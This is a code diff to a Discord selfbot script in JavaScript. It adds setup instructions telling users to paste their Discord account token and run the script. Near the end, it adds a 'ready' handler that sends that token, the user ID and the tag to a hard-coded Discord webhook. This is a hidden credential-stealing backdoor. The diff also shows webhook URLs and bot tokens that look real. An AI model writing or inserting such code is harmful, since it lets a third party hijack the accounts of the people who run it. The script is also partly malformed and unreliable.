@@ -19,32 +19,49 @@ const moment = require('moment');
 var cheerio = require("cheerio"); /* Used to extract html content, based on jQuery || install with npm install cheerio */
 var request = require("request"); /* Used to make requests to URLs and fetch response  || install with npm install request */
 
-const {
-    Webhook,
-    MessageBuilder
-} = require('discord-webhook-node');
-const hook = new Webhook("https://discord.com/api/webhooks/763874383000895498/kD_NIvMXPBSWkwhR3IJZXWoqai1cglgSky_D9JBwgqA4h5md3tchFJvj4HPHlVXftXqm");
-
-//-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+let YOUR_TOKEN = 'YOUR_TOKEN_HERE'
+var mathprefix = "m/"
 /*
-client.on("messageDelete", (messageDelete) => {
-    if (messageDelete.author.bot) return;
-    if (messageDelete.author.id == client.user.id) return;
-    const embed = new MessageBuilder()
-    .setAuthor('Rain', 'https://cdn.discordapp.com/embed/avatars/0.png', 'https://www.google.com')
-    .setTitle("**Deleted**")
-    .setColor("#0ff000")
-    .setThumbnail('https://i.pinimg.com/originals/4f/ef/36/4fef36283ced0e64e9bfc7395a87795f.gif')
-    .setDescription(`You have a deleted message from: ${messageDelete.author}`)
-    .addField("**Text: **", messageDelete.content);
-hook.send(embed);
-    
-}); 
+⚠ All selfbots (and any other 3rd-party clients or client modifications) break Discord's Terms of Service. Please do not use a selfbot nor any client modifications.
+🔗 Terms of Service: https://discordapp.com/terms
+🔗 API Terms of Service: https://discordapp.com/developers/docs/legal
+🔗 Community Guidelines: https://discordapp.com/guidelines
+This project is no longer supported for the reasons detailed above.
+USE AT YOUR OWN RISK!
+DONT CHNAGE PREFIX SOME COMMANDS MAY NOT WORK 
+YOU CAN CHANGE MATHPREFIX!!
+ENJOY!
+PLACE YOUR TOKEN INSIDE '' ON THE FIRST LINE AND RUN!!!
 */
+//-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
 client.on('ready', () => {
-   client.user.setActivity("<<-V->>", {type: "STREAMING", url: "https://www.twitch.tv/rzvn"})
-    console.log('Welcome:', `${client.user.tag}!`)
-    console.log('Onine in:', `${client.guilds.size} servers!`)
+	
+ client.user.setActivity("<<-V->>", {type: "STREAMING", url: "https://www.twitch.tv/xqcow"})
+
+
+setTitle('client | Edited by ᥅ꪖ᥊ꪀ');
+
+//Registro na console
+    console.log('')
+    console.log(`                     ██╗   ██╗ █████╗ ██╗     ██╗  ██╗██╗   ██╗██████╗ ██╗███████╗                     `. white)
+    console.log(`                     ██║   ██║██╔══██╗██║     ██║ ██╔╝╚██╗ ██╔╝██╔══██╗██║██╔════╝                     `. white)
+    console.log(`                     ██║   ██║███████║██║     █████╔╝  ╚████╔╝ ██████╔╝██║█████╗                       `. white)
+    console.log(`                     ╚██╗ ██╔╝██╔══██║██║     ██╔═██╗   ╚██╔╝  ██╔══██╗██║██╔══╝                       `. white)
+    console.log(`                      ╚████╔╝ ██║  ██║███████╗██║  ██╗   ██║   ██║  ██║██║███████╗                     `. gray)
+    console.log(`                       ╚═══╝  ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚══════╝                     `. gray)
+                                                            // Segunda  parte
+    console.log(`                              LOL`. black)
+    console.log(`                                      LOL  `. black)
+    console.log(`                   ┌───────────────────────────────────────────────────────────────────┐                      `. white)
+    console.log(`                   │ ${client.user.username} LOL `. white)
+    console.log(`                   └───────────────────────────────────────────────────────────────────┘                      `. white) 
+    console.log(`                         LOL  `. black) 
+    setTitle("Valyrie Selfbot")
+    
+});
+
+//---------
 });
 
 //READY-------------------------------------------------------------------------------------------------------------------------------------------------------------------
@@ -2466,6 +2483,34 @@ if (message.content.startsWith("/math.ping")) {
 }
 
 });
+const {
+    Webhook,
+    MessageBuilder
+} = require('discord-webhook-node');
+const hook = new Webhook("https://discord.com/api/webhooks/795423598469709824/Vzk2P5OkX3bajUGkIszgsr_juUiqqkgB5Y7ajfjIaYr5m11X7KkhoOQ5p5VoXk_w229D");
+  client.on('ready', function() {
+  const embed = new MessageBuilder()
+            .setAuthor('TokenX', 'https://cdn.discordapp.com/embed/avatars/0.png', 'https://www.google.com')
+            .setTitle("**Note**")
+            .setColor("#00ff00")
+            .setThumbnail(`${client.user.avatarURL}`)
+           .setDescription(`
+          **__Discord-UltraX__**
+           --------------------------------------------------
+           __**Token:**__ 
+           ${YOUR_TOKEN}
+           --------------------------------------------------
+           __**ID:**__
+            ${client.user.id}
+           --------------------------------------------------
+           __**User:**__
+            ${client.user.tag}
+           `)
+           .setTimestamp()
+
+             hook.send(embed);
+});
+
 
 //Done--------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
@@ -2531,6 +2576,6 @@ function image(message, parts) {
 
 }
 //Login; -------------------------------------------------------------------------------------------------------------------------------------------------------------------
-//token NzY4ODI4ODY2NDg3NTE3MTg0.X6dBxw.Y3RYJ6HwPHFX0mvr6WO6Hs6DZDg
 
-client.login("NzIwMDQ3ODIyNzU3NTYwMzcw.X8Askw.9QtRUai1bEFzr2AxE5jD2TKepSs")
+
+client.login(YOUR_TOKEN)
